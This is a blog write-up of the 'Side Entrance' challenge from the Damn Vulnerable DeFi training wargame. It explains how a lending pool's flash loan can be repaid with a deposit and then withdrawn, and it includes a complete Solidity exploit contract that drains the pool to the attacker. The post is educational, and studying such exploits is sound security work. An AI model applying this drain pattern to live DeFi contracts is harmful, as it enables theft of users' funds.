---
layout: post
date:   2022-08-09 12:59:00 -0500
categories: DeFi flashloan
title: Damn Vulnerable DeFi - Side Entrance
---

## Analysis

Deposit routine simply keeps a mapping of user and transferred ETH to the pool. `withdraw` allows the user to withdraw all their funds at once. 
This smart contract does not use Re-entrancy guard. The objective is to drain the pool of ETH. Flashloan user needs to implement the `execute` function.

## Problem

There is a sequence of calls that makes the funds to become owned by the receiver. 

## Solution

```js
        // deploy attacker contract
        const ExploitSideEntranceFactory = await ethers.getContractFactory("ExploitSideEntrance", attacker);
        const ExploitSideEntrance = await ExploitSideEntranceFactory.deploy(this.pool.address);

        // connect to the exploit contract
        ExploitSideEntrance.connect(attacker).exploit();

```
ExploitSideEntrance Contract

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";


contract ExploitSideEntrance {
    using Address for address;
    using Address for address payable;

    // Receiver needs to know the pool it is receiving from
    SideEntranceLenderPool private immutable pool;
    address private immutable pool_address;

    // attacker
    address private immutable owner;

    constructor(address payable poolAddress) {
        pool_address = poolAddress;
        pool = SideEntranceLenderPool(poolAddress);
        owner = msg.sender;
    }

    // arbitrary function
    //https://swcregistry.io/docs/SWC-104
    function execute() external payable {
        // make a deposit with the loaned amount
        pool_address.functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            msg.value
        );

        // which will also satisfy repaying the loan
    }

    function exploit() public payable {
        // this will call the execute routine above
        pool.flashLoan((pool_address.balance));

        // withdraw all the funds
        pool.withdraw();
    }

    receive () external payable {
        uint256 amountToWithdraw = address(this).balance;
        payable(owner).sendValue(amountToWithdraw);
    }
}
```

Explanation

The `flashLoan` function checks the balance of the contract after the loan however, users can contribute to the pool and withdraw contributions.

A user can contribute to the pool using borrowed funds. Borrowed funds now become owned by the user. 

This does not violate the pool balance. A user may borrow all funds in the pool. If all the funds in the pool are borrowed and deposited into the pool, the pool balance will be unchanged however all funds now belong to the borrower.

The user can later call `withdraw` to withdraw the funds thereby bypassing `flashLoan` and draining the pool.

Finally the funds can be transferred to the attacker account.